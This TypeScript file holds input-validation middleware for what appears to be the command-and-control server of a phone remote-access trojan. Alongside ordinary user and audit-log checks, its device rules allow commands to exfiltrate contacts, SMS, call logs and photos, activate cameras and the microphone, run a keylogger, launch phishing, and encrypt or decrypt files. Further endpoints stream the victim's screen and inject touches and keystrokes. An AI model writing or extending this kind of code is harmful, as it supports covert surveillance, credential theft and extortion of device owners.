// Input Validation Middleware using express-validator
import { body, param, query, ValidationChain, validationResult } from 'express-validator';
import { Request, Response, NextFunction } from 'express';
import { UserRole } from './auth';
const USER_ROLES: UserRole[] = ['admin', 'manager', 'operator', 'viewer'];

/**
 * Middleware to check validation results
 */
export const validate = (req: Request, res: Response, next: NextFunction): void => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    res.status(400).json({ 
      error: 'Validation failed', 
      details: errors.array() 
    });
    return;
  }
  next();
};

/**
 * Validation rules for authentication
 */
export const authValidation = {
  register: [
    body('username')
      .trim()
      .isLength({ min: 3, max: 50 })
      .withMessage('Username must be between 3 and 50 characters')
      .matches(/^[a-zA-Z0-9_-]+$/)
      .withMessage('Username can only contain letters, numbers, underscores, and hyphens'),
    
    body('email')
      .trim()
      .isEmail()
      .withMessage('Must be a valid email address')
      .normalizeEmail(),
    
    body('password')
      .isLength({ min: 8 })
      .withMessage('Password must be at least 8 characters long')
      .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
      .withMessage('Password must contain at least one lowercase letter, one uppercase letter, and one number'),
    
    body('role')
      .optional()
      .isIn(USER_ROLES)
      .withMessage('Invalid role'),
    
    validate,
  ],

  login: [
    body('username')
      .trim()
      .notEmpty()
      .withMessage('Username is required'),
    
    body('password')
      .notEmpty()
      .withMessage('Password is required'),
    
    validate,
  ],
};

/**
 * Validation rules for user management
 */
export const userValidation = {
  create: [
    body('username')
      .trim()
      .isLength({ min: 3, max: 50 })
      .withMessage('Username must be between 3 and 50 characters')
      .matches(/^[a-zA-Z0-9_-]+$/)
      .withMessage('Username can only contain letters, numbers, underscores, and hyphens'),
    
    body('email')
      .trim()
      .isEmail()
      .withMessage('Must be a valid email address')
      .normalizeEmail(),
    
    body('password')
      .isLength({ min: 8 })
      .withMessage('Password must be at least 8 characters long'),
    
    body('role')
      .optional()
      .isIn(USER_ROLES)
      .withMessage('Invalid role'),
    
    validate,
  ],

  update: [
    param('id')
      .isUUID()
      .withMessage('Invalid user ID'),
    
    body('username')
      .optional()
      .trim()
      .isLength({ min: 3, max: 50 })
      .withMessage('Username must be between 3 and 50 characters'),
    
    body('email')
      .optional()
      .trim()
      .isEmail()
      .withMessage('Must be a valid email address')
      .normalizeEmail(),
    
    body('password')
      .optional()
      .isLength({ min: 8 })
      .withMessage('Password must be at least 8 characters long'),
    
    body('role')
      .optional()
      .isIn(USER_ROLES)
      .withMessage('Invalid role'),
    
    validate,
  ],

  delete: [
    param('id')
      .isUUID()
      .withMessage('Invalid user ID'),
    
    validate,
  ],
};

/**
 * Validation rules for devices
 */
export const deviceValidation = {
  getById: [
    param('id')
      .isUUID()
      .withMessage('Invalid device ID'),
    
    validate,
  ],

  sendCommand: [
    param('id')
      .isUUID()
      .withMessage('Invalid device ID'),
    
    body('command')
      .notEmpty()
      .withMessage('Command is required')
      .isIn([
        'contacts', 'sms', 'calls', 'gallery',
        'main-camera', 'selfie-camera', 'microphone', 'screenshot',
        'toast', 'vibrate', 'play-audio', 'stop-audio',
        'clipboard', 'sendSms', 'keylogger-on', 'keylogger-off',
        'open-url', 'phishing', 'encrypt', 'decrypt',
        'apps', 'file-explorer', 'all-sms', 'popNotification',
      ])
      .withMessage('Invalid command type'),
    
    body('params')
      .optional()
      .isObject()
      .withMessage('Params must be an object'),
    
    validate,
  ],

  delete: [
    param('id')
      .isUUID()
      .withMessage('Invalid device ID'),
    
    validate,
  ],

  screenStream: [
    param('id')
      .isUUID()
      .withMessage('Invalid device ID'),
    
    validate,
  ],

  injectTouch: [
    param('id')
      .isUUID()
      .withMessage('Invalid device ID'),
    
    body('action')
      .notEmpty()
      .withMessage('Action is required'),
    
    body('x')
      .isNumeric()
      .withMessage('X coordinate must be a number'),
    
    body('y')
      .isNumeric()
      .withMessage('Y coordinate must be a number'),
    
    validate,
  ],

  injectKeyboard: [
    param('id')
      .isUUID()
      .withMessage('Invalid device ID'),
    
    body()
      .custom((value) => {
        if (!value.text && !value.keyCode) {
          throw new Error('Either text or keyCode is required');
        }
        return true;
      }),
    
    validate,
  ],
};

/**
 * Validation rules for audit logs
 */
export const auditValidation = {
  list: [
    query('user_id')
      .optional()
      .isUUID()
      .withMessage('Invalid user ID'),
    
    query('action')
      .optional()
      .isString()
      .withMessage('Action must be a string'),
    
    query('startDate')
      .optional()
      .isISO8601()
      .withMessage('Start date must be a valid ISO 8601 date'),
    
    query('endDate')
      .optional()
      .isISO8601()
      .withMessage('End date must be a valid ISO 8601 date'),
    
    query('limit')
      .optional()
      .isInt({ min: 1, max: 1000 })
      .withMessage('Limit must be between 1 and 1000'),
    
    validate,
  ],

  export: [
    query('startDate')
      .optional()
      .isISO8601()
      .withMessage('Start date must be a valid ISO 8601 date'),
    
    query('endDate')
      .optional()
      .isISO8601()
      .withMessage('End date must be a valid ISO 8601 date'),
    
    validate,
  ],
};

/**
 * Validation rules for file uploads
 */
export const uploadValidation = {
  download: [
    param('filename')
      .matches(/^[a-zA-Z0-9_-]+\.[a-zA-Z0-9]+$/)
      .withMessage('Invalid filename format'),
    
    validate,
  ],
};

export default {
  validate,
  authValidation,
  userValidation,
  deviceValidation,
  auditValidation,
  uploadValidation,
};
